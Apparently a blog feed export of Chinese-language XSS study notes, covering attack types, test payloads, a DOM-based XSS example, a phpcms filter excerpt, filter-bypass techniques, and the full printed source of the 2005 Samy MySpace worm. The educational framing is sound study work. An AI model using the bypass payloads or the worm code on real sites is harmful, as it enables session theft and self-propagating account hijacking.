class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">="</span>&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG src=<span class="string">"javascript:alert('XSS');"</span>&gt;</span><br></pre></td></tr></table></figure><p>如果提交后发现页面出现排版问题或者JS错误，也说明这个输入框可能存在XSS漏洞。<br>关于这个方法，由安全研究者Rsanke维护的XSS语句列表中持续更新最新的xss语句，大家可以参考测试web应用程序是否存在xss漏洞。<br>传送：<a href="http://ha.ckers.org/xss.html" target="_blank" rel="noopener">http://ha.ckers.org/xss.html</a></p><h4 id="2-源代码安全审计-白盒）"><a href="#2-源代码安全审计-白盒）" class="headerlink" title="2.源代码安全审计(白盒）"></a>2.源代码安全审计(白盒）</h4><p>这里的源代码指的是web服务端的程序代码，如ASP,JSP,PHP等。<br>一般思路是：查找可能咋页面输出的变量，检验他们是否受到控制，然后跟踪这些变量的传递过程，分析他们是否被HTMLlencode()之类的函数过滤。<br>推荐一个大佬的操作实例，传送门：<a href="https://www.freebuf.com/articles/web/186163.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/186163.html</a></p><h4 id="3-JavaScript代码分析"><a href="#3-JavaScript代码分析" class="headerlink" title="3.JavaScript代码分析"></a>3.JavaScript代码分析</h4><p>由于Javascript功能强大，能控制Web客户端的逻辑，甚至能操作用户的输入与输出。在这个过程中，如果用户的恶意输入没有被正确处理就可能产生XSS。<br>记录一种特别的XSS—DOM-Based XSS.<br>前面的学习已经提到，DOM-Based XSS是基于DOM文档对象模型的一种漏洞，受客户端浏览器的脚本代码所影响。<br>记录一个例子：假设有如下代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt; DOM-XSS <span class="built_in">test</span> &lt;/title&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;script&gt;</span><br><span class="line"> var a=document.URL;</span><br><span class="line"> document.write(a.substring(a,indexOf(<span class="string">"a="</span>)+2,a.length));</span><br><span class="line"> &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>将以上代码保存在domXSS.html,中，然后用浏览器访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/domXSS.html?a=<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>页面打印出test信息，上述代码在解析URL过程中直接提取出a参数的值，并把这个值写入页面的HTML源代码中。<br>然而，攻击者可能会以Javascript代码作为a的参数的值，导致这段代码被动态的写入页面中。如构造一个恶意的请求地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/domXSS.html?a=&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>当访问以上地址时，服务器返回包含上面脚本的HTML静态文本，浏览器会把HTML文本解析成DOM，并向服务器返回代码一样执行。结果如下图：<br><img src="https://img-blog.csdnimg.cn/20191104210540934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="1"><br>由此可见，DOM XSS受客户端脚本代码的影响，分析客户端Javascript的方式，便能发掘出基于XSS的漏洞。</p><p>国外安全研究员Amit Klein发表的一篇论文中详细的讲述了DOM-Based XSS的许多概念和技术，还列举了许多可能触发改漏洞的DOM对象，附上传送门：<br><a href="http://www.webappsec.org/projects/articles/071105.html" target="_blank" rel="noopener">http://www.webappsec.org/projects/articles/071105.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss学习日记(三）</title>
      <link href="/2019/11/02/note3/"/>
      <url>/2019/11/02/note3/</url>
      
        <content type="html"><![CDATA[<h3 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>XSS蠕虫是指一种具有自我传播能力的XSS攻击，杀伤力很大。引发XSS蠕虫的条件比较高，需要在用户之间发生交互行为的页面，这样才能形成有效的传播。一般要同时结合反射型XSS和存储型XSS。（百度百科)<a id="more"></a><br>当xss蠕虫与社会工程学相结合，其危害性将变得十分可怕（用户兴趣点及好奇心）。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>1.攻击者发现一个网站存在XSS漏洞，并且可以编写xss蠕虫。<br>2.利用一个宿主（用户）作为传播源头进行xss攻击。<br>3.当其他用户访问被感染的内容（页面），xss蠕虫执行以下操作。<br>  A 判断用户是否登录，如果已经登陆就执行下一步，如果没有登录则执行其他操作。<br>  B 继续判断该用户是否被感染，如果没有就感染了他，如果感染了就跳过。</p><h4 id="构建过程"><a href="#构建过程" class="headerlink" title="构建过程"></a>构建过程</h4><p>1.寻找XSS点<br>2。实现蠕虫行为<br>3.收集蠕虫数据<br>4.传播与感染<br>参考文章<a href="https://bbs.ichunqiu.com/thread-29149-1-1.html?from=db" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-29149-1-1.html?from=db</a></p><h4 id="世界上第一个xss蠕虫病毒-里程碑"><a href="#世界上第一个xss蠕虫病毒-里程碑" class="headerlink" title="世界上第一个xss蠕虫病毒(里程碑)"></a>世界上第一个xss蠕虫病毒(里程碑)</h4><p>  2005年10月4日，第一个web2.0 蠕虫诞生，年仅19岁的samy发起了对myspace.com的xss worm攻击，下附其源代码，实现方法及原理分析参考文章<br>  <a href="https://www.freebuf.com/articles/web/19408.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/19408.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">  &lt;div id=mycode style=<span class="string">"BACKGROUND:url('java </span></span><br><span class="line"><span class="string">script:eval(document.all.mycode.expr)')"</span>expr=<span class="string">"var B=String.fromCharCode(34);varA=String.fromCharCode(39);function g()&#123;varC;try&#123;varD=document.body.createTextRange();C=D.htmlText&#125;catch(e)&#123;&#125;if(C)&#123;return</span></span><br><span class="line"><span class="string">C&#125;else&#123;return eval('document.body.inne'+'rHTML')&#125;&#125;function</span></span><br><span class="line"><span class="string">getData(AU)&#123;M=getFromURL(AU,'friendID');L=getFromURL(AU,'Mytoken')&#125;function getQueryParams()&#123;varE=document.location.search;var F=E.substring(1,E.length).split('&amp;');var AS=new Array();for(varO=0;O&lt;F.length;O++)&#123;varI=F[O].split('=');AS[I[0]]=I[1]&#125;return AS&#125;var J;varAS=getQueryParams();varL=AS['Mytoken'];varM=AS['friendID'];if(location.hostname=='profile.myspace.com')&#123;document.location='http://www.myspace.com'+location.pathname+location.search&#125;else&#123;if(!M)&#123;getData(g())&#125;main()&#125;functiongetClientFID()&#123;return findIn(g(),'up_launchIC( '+A,A)&#125;function nothing()&#123;&#125;functionparamsToString(AV)&#123;var N=new</span></span><br><span class="line"><span class="string">String();var O=0;for(var P</span></span><br><span class="line"><span class="string">in AV)&#123;if(O&gt;0)&#123;N+='&amp;'&#125;varQ=escape(AV[P]);while(Q.indexOf('+')!=-1)&#123;Q=Q.replace('+','%2B')&#125;while(Q.indexOf('&amp;')!=-1)&#123;Q=Q.replace('&amp;','%26')&#125;N+=P+'='+Q;O++&#125;return</span></span><br><span class="line"><span class="string">N&#125;function httpSend(BH,BI,BJ,BK)&#123;if(!J)&#123;return</span></span><br><span class="line"><span class="string">false&#125;eval('J.onr'+'eadystatechange=BI');J.open(BJ,BH,true);if(BJ=='POST')&#123;J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');J.setRequestHeader('Content-Length',BK.length)&#125;J.send(BK);return</span></span><br><span class="line"><span class="string">true&#125;function findIn(BF,BB,BC)&#123;varR=BF.indexOf(BB)+BB.length;varS=BF.substring(R,R+1024);returnS.substring(0,S.indexOf(BC))&#125;functiongetHiddenParameter(BF,BG)&#123;return findIn(BF,'name='+B+BG+B+' value='+B,B)&#125;function getFromURL(BF,BG)&#123;var T;if(BG=='Mytoken')&#123;T=B&#125;else&#123;T='&amp;'&#125;var U=BG+'=';varV=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y&#125;function getXMLObj()&#123;var Z=false;if(window.XMLHttpRequest)&#123;try&#123;Z=new XMLHttpRequest()&#125;catch(e)&#123;Z=false&#125;&#125;else</span></span><br><span class="line"><span class="string">if(window.ActiveXObject)&#123;try&#123;Z=new ActiveXObject('Msxml2.XMLHTTP')&#125;catch(e)&#123;try&#123;Z=newActiveXObject('Microsoft.XMLHTTP')&#125;catch(e)&#123;Z=false&#125;&#125;&#125;return</span></span><br><span class="line"><span class="string">Z&#125;var AA=g();var AB=AA.indexOf('m'+'ycode');var AC=AA.substring(AB,AB+4096);varAD=AC.indexOf('D'+'IV');var AE=AC.substring(0,AD);varAF;if(AE)&#123;AE=AE.replace('jav'+'a',A+'jav'+'a');AE=AE.replace('exp'+'r)','exp'+'r)'+A);AF='</span></span><br><span class="line"><span class="string">but most of all, samy is my hero. &lt;d'+'iv id='+AE+'D'+'IV&gt;'&#125;var AG;function getHome()&#123;if(J.readyState!=4)&#123;return&#125;varAU=J.responseText;AG=findIn(AU,'P'+'rofileHeroes','&lt;/td&gt;');AG=AG.substring(61,AG.length);if(AG.indexOf('samy')==-1)&#123;if(AF)&#123;AG+=AF;var</span></span><br><span class="line"><span class="string">AR=getFromURL(AU,'Mytoken');var</span></span><br><span class="line"><span class="string">AS=new</span></span><br><span class="line"><span class="string">Array();AS['interestLabel']='heroes';AS['submit']='Preview';AS['interest']=AG;J=getXMLObj();httpSend('/index.cfm?fuseaction=profile.previewInterests&amp;Mytoken='+AR,postHero,'POST',paramsToString(AS))&#125;&#125;&#125;functionpostHero()&#123;if(J.readyState!=4)&#123;return&#125;var AU=J.responseText;var AR=getFromURL(AU,'Mytoken');var</span></span><br><span class="line"><span class="string">AS=new</span></span><br><span class="line"><span class="string">Array();AS['interestLabel']='heroes';AS['submit']='Submit';AS['interest']=AG;AS['hash']=getHiddenParameter(AU,'hash');httpSend('/index.cfm?fuseaction=profile.processInterests&amp;Mytoken='+AR,nothing,'POST',paramsToString(AS))&#125;function</span></span><br><span class="line"><span class="string">main()&#123;var AN=getClientFID();varBH='/index.cfm?fuseaction=user.viewProfile&amp;friendID='+AN+'&amp;Mytoken='+L;J=getXMLObj();httpSend(BH,getHome,'GET');xmlhttp2=getXMLObj();httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&amp;friendID=11851658&amp;Mytoken='+L,processxForm,'GET')&#125;functionprocessxForm()&#123;if(xmlhttp2.readyState!=4)&#123;return&#125;var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,'hashcode');var AR=getFromURL(AU,'Mytoken');var</span></span><br><span class="line"><span class="string">AS=new</span></span><br><span class="line"><span class="string">Array();AS['hashcode']=AQ;AS['friendID']='11851658';AS['submit']='Add to</span></span><br><span class="line"><span class="string">Friends';httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&amp;Mytoken='+AR,nothing,'POST',paramsToString(AS))&#125;function</span></span><br><span class="line"><span class="string">httpSend2(BH,BI,BJ,BK)&#123;if(!xmlhttp2)&#123;return</span></span><br><span class="line"><span class="string">false&#125;eval('xmlhttp2.onr'+'eadystatechange=BI');xmlhttp2.open(BJ,BH,true);if(BJ=='POST')&#123;xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp2.setRequestHeader('Content-Length',BK.length)&#125;xmlhttp2.send(BK);return</span></span><br><span class="line"><span class="string">true&#125;"</span>&gt;&lt;/DIV&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss学习日记(二）</title>
      <link href="/2019/11/01/note2/"/>
      <url>/2019/11/01/note2/</url>
      
        <content type="html"><![CDATA[<h2 id="xss构造剖析"><a href="#xss构造剖析" class="headerlink" title="xss构造剖析"></a>xss构造剖析</h2><h4 id="1-XSS-filter"><a href="#1-XSS-filter" class="headerlink" title="1.XSS-filter"></a>1.XSS-filter</h4><p>为了防御跨站脚本攻击。开发人员会在web应用中设计一个XSS Filter,即<strong>跨站脚本过滤器</strong>，用于分析用户提交的输入，并消除潜在的跨站脚本攻击，恶意的HTML或简单的HTML格式错误等<a id="more"></a><br>它实际上是一段精心编写的过滤函数，下列是phpcms中的过滤代码文件global.func.php中的一段代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">    <span class="variable">$parm1</span> = Array(<span class="string">'javascript'</span>, <span class="string">'vbscript'</span>, <span class="string">'expression'</span>, <span class="string">'applet'</span>, <span class="string">'meta'</span>, <span class="string">'xml'</span>, <span class="string">'blink'</span>, <span class="string">'link'</span>, <span class="string">'script'</span>, <span class="string">'embed'</span>, <span class="string">'object'</span>, <span class="string">'iframe'</span>, <span class="string">'frame'</span>, <span class="string">'frameset'</span>, <span class="string">'ilayer'</span>, <span class="string">'layer'</span>, <span class="string">'bgsound'</span>, <span class="string">'title'</span>, <span class="string">'base'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$parm2</span> = Array(<span class="string">'onabort'</span>, <span class="string">'onactivate'</span>, <span class="string">'onafterprint'</span>, <span class="string">'onafterupdate'</span>, <span class="string">'onbeforeactivate'</span>, <span class="string">'onbeforecopy'</span>, <span class="string">'onbeforecut'</span>, <span class="string">'onbeforedeactivate'</span>, <span class="string">'onbeforeeditfocus'</span>, <span class="string">'onbeforepaste'</span>, <span class="string">'onbeforeprint'</span>, <span class="string">'onbeforeunload'</span>, <span class="string">'onbeforeupdate'</span>, <span class="string">'onblur'</span>, <span class="string">'onbounce'</span>, <span class="string">'oncellchange'</span>, <span class="string">'onchange'</span>, <span class="string">'onclick'</span>, <span class="string">'oncontextmenu'</span>, <span class="string">'oncontrolselect'</span>, <span class="string">'oncopy'</span>, <span class="string">'oncut'</span>, <span class="string">'ondataavailable'</span>, <span class="string">'ondatasetchanged'</span>, <span class="string">'ondatasetcomplete'</span>, <span class="string">'ondblclick'</span>, <span class="string">'ondeactivate'</span>, <span class="string">'ondrag'</span>, <span class="string">'ondragend'</span>, <span class="string">'ondragenter'</span>, <span class="string">'ondragleave'</span>, <span class="string">'ondragover'</span>, <span class="string">'ondragstart'</span>, <span class="string">'ondrop'</span>, <span class="string">'onerror'</span>, <span class="string">'onerrorupdate'</span>, <span class="string">'onfilterchange'</span>, <span class="string">'onfinish'</span>, <span class="string">'onfocus'</span>, <span class="string">'onfocusin'</span>, <span class="string">'onfocusout'</span>, <span class="string">'onhelp'</span>, <span class="string">'onkeydown'</span>, <span class="string">'onkeypress'</span>, <span class="string">'onkeyup'</span>, <span class="string">'onlayoutcomplete'</span>, <span class="string">'onload'</span>, <span class="string">'onlosecapture'</span>, <span class="string">'onmousedown'</span>, <span class="string">'onmouseenter'</span>, <span class="string">'onmouseleave'</span>, <span class="string">'onmousemove'</span>, <span class="string">'onmouseout'</span>, <span class="string">'onmouseover'</span>, <span class="string">'onmouseup'</span>, <span class="string">'onmousewheel'</span>, <span class="string">'onmove'</span>, <span class="string">'onmoveend'</span>, <span class="string">'onmovestart'</span>, <span class="string">'onpaste'</span>, <span class="string">'onpropertychange'</span>, <span class="string">'onreadystatechange'</span>, <span class="string">'onreset'</span>, <span class="string">'onresize'</span>, <span class="string">'onresizeend'</span>, <span class="string">'onresizestart'</span>, <span class="string">'onrowenter'</span>, <span class="string">'onrowexit'</span>, <span class="string">'onrowsdelete'</span>, <span class="string">'onrowsinserted'</span>, <span class="string">'onscroll'</span>, <span class="string">'onselect'</span>, <span class="string">'onselectionchange'</span>, <span class="string">'onselectstart'</span>, <span class="string">'onstart'</span>, <span class="string">'onstop'</span>, <span class="string">'onsubmit'</span>, <span class="string">'onunload'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$parm</span> = array_merge(<span class="variable">$parm1</span>, <span class="variable">$parm2</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; sizeof(<span class="variable">$parm</span>); <span class="variable">$i</span>++) &#123; </span><br><span class="line"></span><br><span class="line"> <span class="variable">$pattern</span> = <span class="string">'/'</span>; </span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$j</span> = 0; <span class="variable">$j</span> &lt; strlen(<span class="variable">$parm</span>[<span class="variable">$i</span>]); <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$j</span> &gt; 0) &#123; </span><br><span class="line"></span><br><span class="line"> <span class="variable">$pattern</span> .= <span class="string">'('</span>; </span><br><span class="line"></span><br><span class="line"> <span class="variable">$pattern</span> .= <span class="string">'(&amp;#[x|X]0([9][a][b]);?)?'</span>; </span><br><span class="line"></span><br><span class="line"> <span class="variable">$pattern</span> .= <span class="string">'|(&amp;#0([9][10][13]);?)?'</span>; </span><br><span class="line"></span><br><span class="line"> <span class="variable">$pattern</span> .= <span class="string">')?'</span>; </span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$pattern</span> .= <span class="variable">$parm</span>[<span class="variable">$i</span>][<span class="variable">$j</span>]; </span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$pattern</span> .= <span class="string">'/i'</span>;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$string</span> = preg_replace(<span class="variable">$pattern</span>, <span class="string">' '</span>, <span class="variable">$string</span>); </span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">return</span> <span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的作用是过滤XSS跨站代码，程序在处理输入变量时使用该函数，就可过滤常见的跨站脚本。<br>但它依旧存在被绕过的可能，下列从攻的角度展示一些绕过XSS Filter的测试用例。</p><h4 id="1-利用-lt-gt-标记注射Html-Javascript"><a href="#1-利用-lt-gt-标记注射Html-Javascript" class="headerlink" title="(1)利用&lt;&gt;标记注射Html/Javascript"></a>(1)利用&lt;&gt;标记注射Html/Javascript</h4><p>如<code>&lt;script&gt;alert;&lt;/script&gt;或&lt;script&gt;shellcode&lt;/script&gt;</code><br>因此，XSS Filter最先要进行过滤和转义的就是“&lt;&gt;”和<code>&lt;script&gt;</code>等字符。</p><h6 id="2-利用HTML标签属性值执行XSS。"><a href="#2-利用HTML标签属性值执行XSS。" class="headerlink" title="(2)利用HTML标签属性值执行XSS。"></a>(2)利用HTML标签属性值执行XSS。</h6><p>如下代码:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=<span class="string">"javescript:alert(/XSS/)"</span>&gt;&lt;/table&gt;</span><br><span class="line">&lt;img scr=<span class="string">"javescript:alert('XSS')"</span>&gt;</span><br></pre></td></tr></table></figure><p>在IE6浏览器中运行上述代码会弹出对话框，即攻击成功，但它具有一定的局限性，即只能在支持javascript:[code]伪协议的浏览器运行。<br>通常只有引用文件的属性才能触发跨站脚本，我们可以使用以下属性来测试XSS</p><p>href=</p><p>lowsrc=</p><p>bgsound=</p><p>background=</p><p>value=</p><p>action=</p><p>dynsrc=<br>所以，要防御基于属性值的XSS，就要过滤javascript等关键字，另外还有其他允许值如Vbscript<br>（3）空格回车Tab</p><p>XSS Filter把敏感的输入字符列入黑名单处理，可以利用空格、回车和Tab键绕过 例：</p><p>&lt;img src=”javas</p><p>script:</p><p>alert(/xss/)”&gt;</p><h4 id="4）对标签属性值转码"><a href="#4）对标签属性值转码" class="headerlink" title="(4）对标签属性值转码"></a>(4）对标签属性值转码</h4><p>对普通HTML标记的属性值过滤，还可以通过编码处理来绕过。</p><p>Tab符的ASCII码&amp;#9、换行符&amp;#10、回车符&amp;#13可以插入任意地方</p><p>为了防范标签纸属性编码的XSS，最好也过滤&amp;#/等字符</p><h4 id="5）产生自己的事件"><a href="#5）产生自己的事件" class="headerlink" title="(5）产生自己的事件"></a>(5）产生自己的事件</h4><p>不能依靠属性值跨站，通过事件，如click、mouseover、load等，响应事件的函数叫事件处理函数例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"#"</span> onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><p>onerror是IMG标记的一个事件，页面发生错误，该事件被激活。上例，解释IMG标记时，加载src属性引用的图片地址，若图片不存在就触发onerror事件。其他事件：onResume</p><p>onReverse</p><p>onRowDelete</p><p>onRowInseted<br>等</p><h4 id="6）利用CSS跨站"><a href="#6）利用CSS跨站" class="headerlink" title="(6）利用CSS跨站"></a>(6）利用CSS跨站</h4><p>CSS中使用expression同样可以触发XSS。例：</p><div style="width: expression(alert('xss'));"><p>脚本代码通常被嵌入到style标签/属性中。style属性可以和任意字符的标签结合，所以不只要过滤标签，还必须对style属性值进行过滤。</p><p>例:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=<span class="string">"list-style-image:url(javascript:alert(‘xss’))"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;img style=<span class="string">"background-image:url(javascript：alert('xss'))"</span>&gt;  等同于</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">" javascript:alert('xss')"</span>&gt;</span><br></pre></td></tr></table></figure><p>此外，可以使用<link>标签引用CSS，除<link>标签外，网页中引用外部CSS还可以利用@import导入，例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style <span class="built_in">type</span>=<span class="string">'test/css'</span>/&gt;import url(http://.../xss.css);&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>@import还可以直接执行JS代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">@import <span class="string">'javascript:alert("xss")'</span>;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>因此，包含expression、javascript、import等敏感字符的样式表也要进行过滤。</p><h4 id="7）扰乱过滤规则"><a href="#7）扰乱过滤规则" class="headerlink" title="(7）扰乱过滤规则"></a>(7）扰乱过滤规则</h4><p>转换大小写、大小写混淆、不用双引号用单引号、不使用引号。IMG标记和src属性之间没有空格</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=<span class="string">"javascript:alert('xss');"</span>&gt;</span><br></pre></td></tr></table></figure><p>利用expression跨站时，可以构造不同的全角字符。<br>运用/**/来注释字符，样式标签中的\和结束符\0。<br>将CSS关键字转码，e转\65，改变编码中0的数量\065、\0065<br>利用浏览器解析HTML注释存在的问题来执行JS，例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--&lt;img src=<span class="string">"--&gt;&lt;img src=x onerror=alert(1)//"</span>&gt;</span><br></pre></td></tr></table></figure><p>纯文本标签造成的混乱标记，例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;&lt;img src=<span class="string">"&lt;/style&gt;&lt;img src=x onerror=alert(1)//"</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h4><p>字符编码在跨站脚本中经常用到，透过这种技巧，不仅能让XSS绕过服务端的过滤，还能更好的隐藏shellcode<br>具体内容推荐博客<br><a href="https://blog.csdn.net/Fly_hps/article/details/82944455" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/82944455</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss学习日记(一)</title>
      <link href="/2019/10/26/note1/"/>
      <url>/2019/10/26/note1/</url>
      
        <content type="html"><![CDATA[<h4 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a>1.基本概念</h4><p>XSS（Cross Site Scripting）攻击全称跨站脚本攻击，是一种通过注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序，从而获取更高的权限、私密网页内容、会话和cookie等各种内容的计算机安全漏洞。 恶意网页程序包括JavaScript、Java、HTML等。<a id="more"></a></p><h4 id="2-类型"><a href="#2-类型" class="headerlink" title="2.类型"></a>2.类型</h4><h6 id="xss攻击可以分成两大类："><a href="#xss攻击可以分成两大类：" class="headerlink" title="xss攻击可以分成两大类："></a>xss攻击可以分成两大类：</h6><p>(1)非持久型攻击：一次性，仅对当次的页面访问产生影响。用户访问一个被攻击者篡改后的链接后，被植入的攻击脚本被游览器执行，从而达到攻击目的。<br>(2)持久型攻击：攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。</p><h6 id="常见的三种XSS攻击类型"><a href="#常见的三种XSS攻击类型" class="headerlink" title="常见的三种XSS攻击类型"></a>常见的三种XSS攻击类型</h6><p>1.反射型(非持久 后端)：<br>通过浏览器直接“反射”给用户，例如攻击者提前构造一个恶意链接，来诱使用户点击，比如这样的一段链接：<code>www.abc.com/?params=&lt;script&gt;alert(/xss/)&lt;/script&gt;。</code><br>2.存储型(持久 后端)：<br>黑客输入的恶意脚本存储在服务器的数据库中。当其他用户浏览页面包含这个恶意脚本的页面，用户将会受到黑客的攻击。一个场景是攻击者在论坛的楼层中包含了一段JavaScript代码，并且服务器没有正确进行过滤输出，那就会造成浏览这个页面的用户执行这段JavaScript代码。<br>3.DOM Based XSS(持久 前端)：<br>一种利用前端代码漏洞进行攻击的攻击方式，前面的反射型XSS与存储型XSS本质都是利用后端代码的漏洞，payload在响应页面中。DOM Based payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。<br>例如提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。</p><h5 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h5><p>本地服务器的的/xssTest 目录下，有一个test.php文件，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $userName=$_GET[<span class="string">'userName'</span>];                    <span 